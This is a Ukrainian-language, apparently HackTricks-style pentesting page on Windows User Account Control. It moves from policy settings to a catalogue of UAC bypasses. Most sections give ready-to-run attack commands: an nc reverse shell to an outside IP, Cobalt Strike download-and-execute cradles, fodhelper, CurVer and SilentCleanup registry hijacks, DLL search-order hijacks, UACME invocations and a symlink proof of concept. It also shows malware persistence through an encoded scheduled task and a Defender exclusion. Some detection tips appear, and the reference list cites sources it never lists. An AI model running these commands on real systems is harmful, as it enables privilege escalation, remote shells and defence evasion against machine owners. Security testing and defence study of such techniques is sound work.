# UAC - User Account Control

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) — це функція, яка забезпечує **запит підтвердження для дій із підвищеними привілеями**. Програми мають різні рівні `integrity`, і програма з **високим рівнем** може виконувати завдання, які **потенційно можуть скомпрометувати систему**. Коли UAC увімкнено, програми та завдання завжди **запускаються в контексті безпеки облікового запису не-адміністратора**, якщо тільки адміністратор явно не дозволить цим програмам/завданням отримати доступ до системи на рівні адміністратора. Це функція зручності, яка захищає адміністраторів від ненавмисних змін, але не вважається межею безпеки.<sup>[[2]](#references)</sup>

Докладніше про рівні integrity:


{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

Коли UAC активовано, користувач-адміністратор отримує 2 токени: токен стандартного користувача для виконання звичайних дій із середнім рівнем integrity і токен із привілеями адміністратора.

На цій [сторінці](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) детально описано, як працює UAC, зокрема процес входу, взаємодію з користувачем та архітектуру UAC.<sup>[[2]](#references)</sup> Адміністратори можуть використовувати політики безпеки для налаштування роботи UAC відповідно до потреб організації на локальному рівні (за допомогою secpol.msc) або налаштовувати й розгортати їх через Group Policy Objects (GPO) у середовищі домену Active Directory. Різні параметри докладно описані [тут](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings). Для UAC можна налаштувати 10 параметрів Group Policy. У наступній таблиці наведено додаткові відомості:

| Параметр Group Policy                                                                                                                                                                                                                                                                                                                                                           | Ключ реєстру                | Параметр за замовчуванням                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Режим схвалення адміністратором для вбудованого облікового запису Administrator](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                                                                           | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\FilterAdministratorToken`   | `0` (Вимкнено)                                             |
| [User Account Control: Поведінка запиту підвищення привілеїв для адміністраторів у режимі схвалення адміністратором](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` | `5` (Запит підтвердження для бінарних файлів, відмінних від Windows, на захищеному робочому столі) |
| [User Account Control: Поведінка запиту підвищення привілеїв для стандартних користувачів](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorUser`  | `1` (Запит облікових даних на захищеному робочому столі)         |
| [User Account Control: Виявляти встановлення програм і запитувати підвищення привілеїв](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                                                                 | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableInstallerDetection`   | `1` (Увімкнено; за замовчуванням вимкнено у версії Enterprise)           |
| [User Account Control: Підвищувати привілеї лише для підписаних і перевірених виконуваних файлів](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ValidateAdminCodeSignatures` | `0` (Вимкнено)                                             |
| [User Account Control: Підвищувати привілеї лише для програм UIAccess, встановлених у захищених розташуваннях](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                                                             | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableSecureUIAPaths`       | `1` (Увімкнено)                                              |
| [User Account Control: Запускати всіх адміністраторів у режимі схвалення адміністратором](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                                                                            | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableLUA`                  | `1` (Увімкнено)                                              |
| [User Account Control: Дозволити програмам UIAccess запитувати підвищення привілеїв без використання захищеного робочого столу](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop)                                   | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableUIADesktopToggle`     | `0` (Вимкнено)                                             |
| [User Account Control: Перемикатися на захищений робочий стіл під час запиту підвищення привілеїв](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                                               | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\PromptOnSecureDesktop`      | `1` (Увімкнено)                                              |
| [User Account Control: Віртуалізувати помилки запису файлів і реєстру в розташуваннях користувача](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                                                     | `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\EnableVirtualization`       | `1` (Увімкнено)                                              |

### Політики встановлення програмного забезпечення у Windows

**локальні політики безпеки** («secpol.msc» у більшості систем) за замовчуванням налаштовані так, щоб **заборонити користувачам без прав адміністратора виконувати встановлення програмного забезпечення**. Це означає, що навіть якщо користувач без прав адміністратора може завантажити інсталятор вашого програмного забезпечення, він не зможе запустити його без облікового запису адміністратора.

### Ключі реєстру для примусового запиту підвищення привілеїв UAC

Як стандартний користувач без прав адміністратора, ви можете переконатися, що **UAC запитуватиме облікові дані** стандартного облікового запису під час спроби виконати певні дії. Для цього потрібно змінити певні **ключі реєстру**, що потребує прав адміністратора, якщо немає **UAC bypass** або якщо зловмисник уже ввійшов до системи як адміністратор.

Навіть якщо користувач входить до групи **Administrators**, ці зміни змушують користувача **повторно ввести облікові дані свого облікового запису**, щоб виконати адміністративні дії.

**На практиці це корисно лише тоді, коли ви вже маєте токен із підвищеними привілеями, UAC bypass або помилкову конфігурацію, яка дозволяє змінювати ці ключі; інакше сам запис до реєстру буде заблоковано.**

Потрібно змінити такі ключі та записи реєстру (значення за замовчуванням наведено в дужках):

- `HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System`:
- `ConsentPromptBehaviorUser` = 1 (3)
- `ConsentPromptBehaviorAdmin` = 1 (5)
- `PromptOnSecureDesktop` = 1 (1)

Це також можна зробити вручну за допомогою інструмента Local Security Policy. Після внесення змін під час адміністративних операцій користувачеві буде запропоновано повторно ввести свої облікові дані.

### Примітка

**User Account Control не є межею безпеки.** Тому стандартні користувачі не можуть вийти за межі своїх облікових записів і отримати права адміністратора без використання локального exploit для підвищення привілеїв.

### Запросити у користувача «повний доступ до комп’ютера»
```powershell
hostname | Set-Clipboard
Enable-PSRemoting -SkipNetworkProfileCheck -Force

cd C:\Users\hacedorderanas\Desktop
New-PSSession -Name "Case ID: 1527846" -ComputerName hostname
Enter-PSSession -ComputerName hostname
```
### UAC Privileges

- Internet Explorer Protected Mode використовує перевірки цілісності, щоб запобігти доступу процесів із високим рівнем цілісності (наприклад, web-браузерів) до даних із низьким рівнем цілісності (наприклад, до папки тимчасових Internet-файлів). Це реалізується запуском браузера з токеном низького рівня цілісності. Коли браузер намагається отримати доступ до даних, що зберігаються в зоні низького рівня цілісності, операційна система перевіряє рівень цілісності процесу та відповідно дозволяє доступ. Ця функція допомагає запобігати атакам віддаленого виконання коду, які намагаються отримати доступ до конфіденційних даних у системі.
- Коли користувач входить до Windows, система створює токен доступу, що містить список привілеїв користувача. Привілеї визначаються як поєднання прав і можливостей користувача. Токен також містить список облікових даних користувача — даних, які використовуються для автентифікації користувача на комп’ютері та доступу до ресурсів у мережі.

### Autoadminlogon

Щоб налаштувати автоматичний вхід до Windows певного користувача під час запуску, встановіть **`AutoAdminLogon` registry key**. Це корисно для kiosk-середовищ або тестування. Використовуйте це лише в захищених системах, оскільки пароль зберігається в registry.

Встановіть такі ключі за допомогою Registry Editor або `reg add`:

- `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`:
- `AutoAdminLogon` = 1
- `DefaultUsername` = username
- `DefaultPassword` = password

Щоб повернути звичайну поведінку входу, встановіть `AutoAdminLogon` у значення 0.

## UAC bypass

> [!TIP]
> Зверніть увагу: якщо у вас є графічний доступ до victim, UAC bypass виконується напряму — достатньо натиснути "Yes", коли з’явиться запит UAC

UAC bypass потрібен у такій ситуації: **UAC активовано, ваш процес працює в контексті середнього рівня цілісності, а ваш користувач належить до administrators group**.

Важливо зазначити, що **обійти UAC набагато складніше, якщо для нього встановлено найвищий рівень безпеки (Always), ніж якщо встановлено будь-який інший рівень (Default).**

### Fast triage from a medium-integrity shell

Перед спробою bypass переконайтеся, що ви перебуваєте в потрібному сценарії, і визначте build хоста, зіставивши його з відомими робочими методами:
```powershell
whoami /groups
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v ConsentPromptBehaviorAdmin
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v PromptOnSecureDesktop
powershell -c "Get-ItemProperty 'HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion' | select ProductName,DisplayVersion,CurrentBuild,UBR"
schtasks /Query /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
```
Практичні примітки:
- Якщо `EnableLUA=0`, обхід не потрібен: будь-який admin token може безпосередньо запросити high integrity.
- `ConsentPromptBehaviorAdmin=2` або `5` — типовий сценарій для auto-elevate / COM-based bypasses.
- `Always Notify` підвищує вимоги, але все одно слід тестувати точну збірку, а не припускати невдачу: UACME досі відстежує деякі методи, `AlwaysNotify compatible` з сучасними збірками Windows.<sup>[[3]](#references)</sup>

### UAC вимкнено

Якщо UAC уже вимкнено (`ConsentPromptBehaviorAdmin` дорівнює **`0`**), можна **виконати reverse shell з admin privileges** (рівень high integrity), використовуючи щось на кшталт:
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **Дуже** базовий UAC "обхід" (повний доступ до файлової системи)

Якщо у вас є shell із користувачем, який входить до групи Administrators, ви можете **підмонтувати** спільний ресурс C$, доступний через SMB (файлова система), локально як новий диск і отримаєте **доступ до всього, що міститься у файловій системі** (навіть до домашньої папки Administrator).

> [!WARNING]
> **Схоже, цей трюк більше не працює**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

The Cobalt Strike techniques will only work if UAC is not set at its max security level

Методи Cobalt Strike працюватимуть лише тоді, коли UAC не встановлено на максимальний рівень безпеки.
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** і **Metasploit** також мають кілька модулів для **обходу** **UAC**.

### Підвищені COM-інтерфейси (`ICMLuaUtil` / `CMSTPLUA`)

COM-об'єкти з автоматичним підвищенням привілеїв залишаються практичною поверхнею UAC у сучасних збірках. `ICMLuaUtil` досі позначений у UACME як такий, що працює в актуальних гілках Windows, а offensive tooling продовжує адаптувати `CMSTPLUA`, поєднуючи процес інтерактивного робочого столу, 64-бітне виконання, а іноді й маскування PEB/процесу перед викликом COM Elevation Moniker.<sup>[[3]](#references)</sup>

Практичні поради:
- Надавайте перевагу **64-бітному** процесу в **інтерактивному сеансі** користувача (зазвичай `explorer.exe` або його дочірньому процесу).
- Якщо raw shell не працює, повторіть спробу з реалізації BOF / UACME замість наївної обгортки `CreateProcess`.
- Очікуйте, що дочірнє виконання відбуватиметься в **окремому підвищеному процесі**; багато BOF не підвищують привілеї поточного beacon на місці.

### KRBUACBypass

Документація та інструмент: [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### Експлойти обходу UAC

[**UACME**](https://github.com/hfiref0x/UACME) — це набір технік обходу UAC. Скомпілюйте його за допомогою Visual Studio або MSBuild; збірка створює кілька виконуваних файлів (наприклад, `Source\Akagi\output\x64\Debug\Akagi.exe`), тому виберіть метод, відповідний цільовій збірці.<sup>[[3]](#references)</sup>\
Будьте обережні: деякі методи обходу запускають видимі програми або підказки, які можуть привернути увагу користувача.<sup>[[3]](#references)</sup>

UACME містить **номер збірки, починаючи з якої кожна техніка почала працювати**.<sup>[[3]](#references)</sup> Ви можете знайти техніку, яка впливає на ваші версії:
```powershell
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Також за допомогою [цієї](https://en.wikipedia.org/wiki/Windows_10_version_history) сторінки можна визначити Windows release `1607` за версіями збірки.

Практичний підхід полягає в тому, щоб спочатку **оцінити збірку хоста**, а вже потім запустити відповідний метод:
```cmd
python main.py --scan uac
Akagi64.exe 33 C:\Windows\System32\cmd.exe
```
- `WinPwnage` швидко порівнює локальну збірку з відомими методами UAC, що дає змогу швидко відкинути непрацюючі PoC.<sup>[[4]](#references)</sup>
- `UACME` залишається найкращим публічним каталогом для зіставлення bypass із точною збіркою. У версії 3.7.1 додано методи 83–85, тоді як у попередньому релізі наявні методи повторно протестовано на **Windows 11 25H2**; перевіряйте таблицю методів і примітки до релізу, а не припускайте, що старий PoC і досі застосовується без змін.<sup>[[3]](#references)[[9]](#references)</sup>

### Ланцюжки WNF/UIAccess, сумісні з Always Notify (UACME 3.7.1)

`Always Notify` не усуває всі UAC bypass. UACME 3.7.1 реалізує три нові методи для x64, які поєднують контрольований користувачем стан середовища/протоколу з поведінкою підвищених scheduled task або UIAccess, і позначає всі їх як `AlwaysNotify compatible`:<sup>[[3]](#references)[[9]](#references)</sup>

- **83 — UnifiedConsent:** перенаправити `SystemRoot`, щоб завдання WNF `\Microsoft\Windows\ConsentUX\UnifiedConsent\UnifiedConsentSyncTask` змусило підвищений `taskhostw.exe` виконати side-load `unifiedconsent.dll`. UACME відстежує цей метод починаючи зі збірки Windows 10 19041.
- **84 — TabTip:** використати той самий примітив зі змінною середовища проти UIAccess `TabTip.exe`, який залежно від збірки завантажує `windows.storage.dll`, `ApplicationTargetedFeatureDatabase.dll` або `rsaenh.dll`, а потім перейти з отриманого контексту UIAccess із високою цілісністю. UACME відстежує цей метод починаючи з Windows 8.1 / Server 2016.
- **85 — Narrator:** перехопити протокол `feedback-hub` для поточного користувача, керувати Narrator за допомогою `Alt+CapsLock+F`, а потім запустити доступну для запису копію `osk.exe`, яка виконує side-load `OskSupport.dll`. Для цього потрібен інтерактивний робочий стіл; метод відстежується починаючи з Windows 10 1809 / Server 2019.

Після створення payload units і Akagi відповідно до документації UACME викличте відповідний номер методу (необов'язкова команда за замовчуванням — `cmd.exe`):
```cmd
Akagi64.exe 83 C:\Windows\System32\cmd.exe
Akagi64.exe 84 C:\Windows\System32\cmd.exe
Akagi64.exe 85 C:\Windows\System32\cmd.exe
```
Methods 84 і 85 залежать від UIAccess/взаємодії з робочим столом, тому не очікуйте, що вони працюватимуть без змін із Session 0 або з non-interactive service shell. Усі три методи змінюють стан середовища/протоколу та розміщують DLL; перевірте реалізацію й видаліть ці артефакти після тестування.<sup>[[3]](#references)[[9]](#references)</sup>

### UAC Bypass – fodhelper.exe (Registry hijack)

Довірений binary `fodhelper.exe` автоматично підвищує рівень привілеїв у сучасних Windows. Під час запуску він звертається до наведеного нижче per-user registry path, не перевіряючи verb `DelegateExecute`. Розміщення там команди дає змогу процесу з Medium Integrity (користувач входить до групи Administrators) запустити процес із High Integrity без запиту UAC.

Registry path, який запитує fodhelper:
```text
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
<details>
<summary>Кроки PowerShell (встановіть свій payload, потім запустіть)</summary>
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
</details>
Примітки:
- Працює, коли поточний користувач є членом групи Administrators, а рівень UAC встановлено за замовчуванням/у послабленому режимі (не Always Notify із додатковими обмеженнями).
- Використовуйте шлях `sysnative`, щоб запустити 64-бітний PowerShell із 32-бітного процесу в 64-бітній Windows.
- Payload може бути будь-якою командою (PowerShell, cmd або шляхом до EXE). Для stealth уникайте UI, що запитують підтвердження.

#### Варіант CurVer/extension hijack (лише HKCU)

У нових зразках, що зловживають `fodhelper.exe`, уникають `DelegateExecute` і натомість **перенаправляють ProgID `ms-settings`** через значення `CurVer` для конкретного користувача. Автоматично підвищуваний binary усе ще шукає обробник у `HKCU`, тому для розміщення ключів не потрібен admin token:<sup>[[5]](#references)</sup>
```powershell
# Point ms-settings to a custom extension (.thm) and map that extension to our payload
New-Item -Path "HKCU:\Software\Classes\.thm\Shell\Open" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\.thm\Shell\Open\command" -Name "(default)" -Value "C:\\ProgramData\\rKXujm.exe" -Force | Out-Null
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings" -Name "CurVer" -Value ".thm" -Force

Start-Process "C:\\Windows\\System32\\fodhelper.exe"   # auto-elevates and runs rKXujm.exe
```
Після підвищення привілеїв malware зазвичай **вимикає майбутні запити** шляхом встановлення `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\ConsentPromptBehaviorAdmin` у значення `0`, а потім виконує додаткове ухилення від захисту (наприклад, `Add-MpPreference -ExclusionPath C:\ProgramData`) і відтворює persistence для запуску з високим рівнем цілісності. Типове завдання persistence зберігає на диску **зашифрований XOR PowerShell script**, а щогодини декодує та виконує його в пам’яті:<sup>[[5]](#references)</sup>
```powershell
schtasks /create /sc hourly /tn "OneDrive Startup Task" /rl highest /tr "cmd /c powershell -w hidden $d=[IO.File]::ReadAllBytes('C:\ProgramData\VljE\zVJs.ps1');$k=[Text.Encoding]::UTF8.GetBytes('Q');for($i=0;$i -lt $d.Length;$i++){$d[$i]=$d[$i]-bxor$k[$i%$k.Length]};iex ([Text.Encoding]::UTF8.GetString($d))"
```
Цей варіант також очищає dropper і залишає лише staged payloads, тому виявлення залежить від моніторингу **`CurVer` hijack**, втручання в `ConsentPromptBehaviorAdmin`, створення виключення Defender або scheduled tasks, які розшифровують PowerShell in-memory.<sup>[[5]](#references)</sup>

### UAC bypass через завдання `SilentCleanup` (`HKCU\Environment\windir`)

`SilentCleanup` запускає `cleanmgr.exe` з найвищими привілеями та розгортає `%windir%` із середовища користувача. Якщо ви контролюєте `HKCU\Environment\windir`, можна перенаправити це розгортання на довільну команду й отримати високий рівень цілісності без діалогового вікна підтвердження.<sup>[[8]](#references)</sup> Цей метод усе ще варто тестувати на новіших збірках, оскільки UACME продовжує підтримувати цю техніку, а відстеження нещодавніх issue показує, що для Windows 11 24H2 можуть знадобитися лише незначні зміни quoting.<sup>[[3]](#references)</sup>
```cmd
reg add "HKCU\Environment" /v windir /d "cmd.exe /c start powershell.exe" /f
schtasks /Run /TN "\Microsoft\Windows\DiskCleanup\SilentCleanup"
reg delete "HKCU\Environment" /v windir /f
```
Якщо завдання цитує шлях у цій збірці, повторіть спробу з payload, що закінчується лапкою (наприклад, `cmd.exe"`). Після тестування завжди очищайте `HKCU\Environment\windir`.

#### Інші UAC bypass

Багато класичних UAC bypass, які зловживають UI-процесами, COM-об’єктами або взаємодією з робочим столом, вимагають **повної інтерактивної сесії** з жертвою; звичайного shell через `nc.exe` або сервісу, що працює в **Session 0**, часто недостатньо.

Зазвичай це можна вирішити за допомогою сесії **meterpreter**. Виконайте міграцію до **process**, у якого значення **Session** дорівнює **1**:

![Point ms-settings to a custom extension (.thm) and map that extension to our payload - More UAC bypass: You can get using a meterpreter session. Migrate to a process that has the Session...](<../../images/image (863).png>)

(_explorer.exe_ має працювати)

### UAC Bypass через GUI

Якщо ви маєте доступ до **GUI, ви можете просто прийняти запит UAC**, коли він з’явиться; технічний bypass насправді не потрібен. Тому отримання GUI-сесії часто достатньо, щоб обійти практичні труднощі, які створює UAC.

Крім того, якщо ви отримали GUI-сесію, якою хтось користувався (потенційно через RDP), **деякі інструменти можуть уже працювати від імені адміністратора**, і з них можна **запустити**, наприклад, **cmd** безпосередньо **як адміністратор**, не отримуючи повторного запиту UAC, як у [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif). Це може бути дещо більш **stealthy**.

### Гучний brute-force UAC bypass

Якщо шум прийнятний, такий інструмент, як [**ForceAdmin**](https://github.com/Chainski/ForceAdmin), може повторно запитувати підвищення привілеїв, доки користувач його не прийме.

### Власний bypass - базова методологія UAC bypass

Якщо переглянути **UACME**, можна помітити, що **багато UAC bypass зловживають DLL hijacking** (часто змушуючи підвищений binary завантажити контрольовану атакувальником DLL із доступного для запису шляху). [Прочитайте це, щоб дізнатися, як знаходити вразливість DLL hijacking](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. Знайдіть binary, який виконує **autoelevate** (перевірте, що під час виконання він запускається на рівні високої цілісності).
2. За допомогою procmon знайдіть події "**NAME NOT FOUND**", які можуть бути вразливими до **DLL Hijacking**.
3. Імовірно, вам потрібно буде **записати** DLL у деякі **захищені шляхи** (наприклад, C:\Windows\System32), де у вас немає дозволів на запис. Це можна обійти за допомогою:
1. **wusa.exe**: Windows 7, 8 і 8.1. Він дає змогу розпакувати вміст CAB-файлу в захищені шляхи (оскільки цей інструмент виконується на рівні високої цілісності).
2. **IFileOperation**: Windows 10.
4. Підготуйте **script**, щоб скопіювати вашу DLL у захищений шлях і запустити вразливий binary з autoelevate.

### Інша техніка UAC bypass

Полягає у перевірці, чи намагається **autoElevated binary** прочитати з **registry** **ім’я/шлях** **binary** або **command**, який потрібно **виконати** (це цікавіше, якщо binary шукає цю інформацію всередині **HKCU**).

### UAC bypass через `SysWOW64\iscsicpl.exe` + DLL hijack користувацького `PATH`

32-бітний `C:\Windows\SysWOW64\iscsicpl.exe` — це **auto-elevated** binary, яким можна зловживати для завантаження `iscsiexe.dll` відповідно до порядку пошуку. Якщо ви можете розмістити шкідливу `iscsiexe.dll` у **доступній для запису користувачем** папці, а потім змінити `PATH` поточного користувача (наприклад, через `HKCU\Environment\Path`), щоб ця папка перевірялася, Windows може завантажити DLL атакувальника в процес підвищених привілеїв `iscsicpl.exe` **без відображення запиту UAC**.<sup>[[1]](#references)[[6]](#references)</sup>

Практичні примітки:
- Це корисно, коли поточний користувач входить до групи **Administrators**, але працює на рівні **Medium Integrity** через UAC.
- Копія в **SysWOW64** є релевантною для цього bypass. Розглядайте копію в **System32** як окремий binary і незалежно перевіряйте його поведінку.
- Примітив є поєднанням **auto-elevation** та **DLL search-order hijacking**, тому той самий робочий процес ProcMon, який використовується для інших UAC bypass, корисний для перевірки відсутнього завантаження DLL.

Мінімальний процес:
```cmd
copy iscsiexe.dll %TEMP%\iscsiexe.dll
reg add "HKCU\Environment" /v Path /t REG_SZ /d "%TEMP%" /f
C:\Windows\System32\cmd.exe /c C:\Windows\SysWOW64\iscsicpl.exe
```
Ідеї для виявлення:
- Створюйте сповіщення про `reg add` / записи до реєстру в `HKCU\Environment\Path`, за якими одразу виконується `C:\Windows\SysWOW64\iscsicpl.exe`.
- Шукайте `iscsiexe.dll` у **контрольованих користувачем** розташуваннях, таких як `%TEMP%` або `%LOCALAPPDATA%\Microsoft\WindowsApps`.
- Співвідносіть запуски `iscsicpl.exe` з неочікуваними дочірніми процесами або завантаженнями DLL із каталогів поза межами стандартних каталогів Windows.

### Новіші дослідження, які варто перевірити окремо

Деякі ланцюжки, опубліковані після 2024 року, більше не мають вигляду класичних підмін реєстру `HKCU\Software\Classes`. Наприклад, poisoning кешу activation context може поєднувати **перенаправлення диска** та **DLL redirection**, щоб перейти від середньої до високої цілісності через довірені UI / auto-elevated бінарні файли, такі як `ctfmon.exe`, а згодом і такі цілі, як `fodhelper.exe`. Замість дублювання великого PoC перевірте компактні приклади payload у:

{{#ref}}
../windows-local-privilege-escalation/windows-c-payloads.md
{{#endref}}

### Підміна літери диска в Administrator Protection (preview) через DOS device map окремої сесії входу

> [!NOTE]
> Станом на серпень 2026 року Microsoft досі документує Administrator Protection як **Insider preview**: розгортання в жовтні 2025 року було скасовано, і його планують здійснити пізніше. Перед тестуванням цих ланцюжків переконайтеся, що **Admin Approval Mode with Administrator protection** фактично ввімкнено, а пристрій перезавантажено; самого рядка версії 25H2 за замовчуванням недостатньо, щоб підтвердити активність функції.<sup>[[10]](#references)</sup>

Щоб ознайомитися з повною поверхнею атаки `RAiLaunchAdminProcess` / UIAccess у preview-збірках Windows 11 25H2, перегляньте спеціальну сторінку:

{{#ref}}
../windows-local-privilege-escalation/uiaccess-admin-protection-bypass.md
{{#endref}}

Windows 11 25H2 “Administrator Protection” використовує shadow-admin токени з картами `\Sessions\0\DosDevices/<LUID>` для окремих сесій. Каталог ліниво створюється `SeGetTokenDeviceMap` під час першого розв’язання `\??`. Якщо зловмисник виконує impersonation shadow-admin токена лише на рівні **SecurityIdentification**, каталог створюється зі зловмисником як **власником** (успадковує `CREATOR OWNER`), що дає змогу створювати посилання на літери дисків, які мають пріоритет над `\GLOBAL??`.<sup>[[7]](#references)</sup>

**Кроки:**

1. Із сесії з низькими привілеями викличте `RAiProcessRunOnce`, щоб запустити shadow-admin `runonce.exe` без відображення prompt.
2. Дублюйте його primary token у токен рівня **identification** та виконайте його impersonation під час відкриття `\??`, щоб примусово створити `\Sessions\0\DosDevices/<LUID>` у власності зловмисника.
3. Створіть там symlink `C:`, що вказує на сховище, контрольоване зловмисником; подальші звернення до файлової системи в цій сесії розв’язуватимуть `C:` як шлях зловмисника, що дає змогу виконати DLL/file hijack без prompt.

**PowerShell PoC (NtObjectManager):**
```powershell
$pid = Invoke-RAiProcessRunOnce
$p = Get-Process -Id $pid
$t = Get-NtToken -Process $p
$id = New-NtTokenDuplicate -Token $t -ImpersonationLevel Identification
Invoke-NtToken $id -ImpersonationLevel Identification { Get-NtDirectory "\??" | Out-Null }
$auth = Get-NtTokenId -Authentication -Token $id
New-NtSymbolicLink "\Sessions\0\DosDevices/$auth/C:" "\??\\C:\\Users\\attacker\\loot"
```
На preview hosts, Administrator Protection записує схвалення та невдалі спроби як ETW-події **15031** і **15032** у межах провайдера `Microsoft-Windows-LUA`. Події містять SID запитувача, шлях до застосунку, результат, керований обліковий запис адміністратора та метод автентифікації, тому повторні спроби експлуатації або невдале керування UI не залишаються без телеметрії.<sup>[[10]](#references)</sup>
```cmd
logman start AdminProtectionTrace -p {93c05d69-51a3-485e-877f-1806a8731346} -ets
rem reproduce the elevation attempt
logman stop AdminProtectionTrace -ets
```
## References

- [1] [LOLBAS: Iscsicpl.exe](https://lolbas-project.github.io/lolbas/Binaries/Iscsicpl/)
- [2] [Документація Microsoft – Як працює User Account Control](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [3] [UACME – колекція технік обходу UAC](https://github.com/hfiref0x/UACME)
- [4] [WinPwnage – сканер сумісності та launcher для обходу UAC](https://github.com/rootm0s/WinPwnage)
